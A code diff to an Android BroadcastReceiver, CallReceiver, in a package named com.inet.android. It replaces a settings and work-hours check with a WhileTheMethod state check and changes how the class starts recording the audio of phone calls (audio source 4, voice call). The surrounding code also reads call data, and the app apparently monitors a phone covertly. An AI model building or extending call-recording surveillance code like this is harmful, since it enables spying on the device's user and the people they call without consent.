@@ -8,10 +8,8 @@ import org.json.JSONObject;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
-import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.os.Bundle;
-import android.preference.PreferenceManager;
 import android.provider.CallLog;
 import android.telephony.TelephonyManager;
 
@@ -20,7 +18,7 @@ import com.inet.android.request.ConstantRequest;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.WorkTimeDefiner;
+import com.inet.android.utils.WhileTheMethod;
 
 /**
  * Class get call
@@ -30,34 +28,19 @@ import com.inet.android.utils.WorkTimeDefiner;
  */
 public class CallReceiver extends BroadcastReceiver {
 	private static Context mContext;
-	private SharedPreferences sp;
 	private static RecordAudio recordAudio = null;
 	private static String LOG_TAG = CallReceiver.class.getSimpleName()
 			.toString();
-
+	private final static int SOURCE_RECORD = 4;
 	@Override
 	public void onReceive(Context context, Intent intent) {
-		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
 		CallReceiver.mContext = context;
-		String call = sp.getString("call", "0");
 		Logging.doLog(LOG_TAG,
 				"intent: " + intent.getAction() + " " + intent.getExtras(),
 				"intent: " + intent.getAction() + " " + intent.getExtras());
 
-		if (call.equals("0")) {
-			Logging.doLog(LOG_TAG, "call : 0 " + intent.getAction(), "call : 0"
-					+ intent.getAction());
+		if (WhileTheMethod.getState(1, context) == 0)
 			return;
-		}
-		boolean isWork = WorkTimeDefiner.isDoWork(mContext);
-		if (!isWork) {
-			Logging.doLog(LOG_TAG, "isWork return " + Boolean.toString(isWork),
-					"isWork return " + Boolean.toString(isWork));
-			return;
-		} else {
-			Logging.doLog(LOG_TAG, "isWork - " + Boolean.toString(isWork),
-					"isWork - " + Boolean.toString(isWork));
-		}
 
 		Bundle bundle = intent.getExtras();
 		String callingSIM = String.valueOf(bundle.getInt("simId", -1));
@@ -111,7 +94,7 @@ public class CallReceiver extends BroadcastReceiver {
 		}
 	}
 	private static void setRecord(){
-		recordAudio = new RecordAudio(mContext);
+		recordAudio = new RecordAudio(-1, SOURCE_RECORD);
 		recordAudio.executeRecording();
 	}
 	
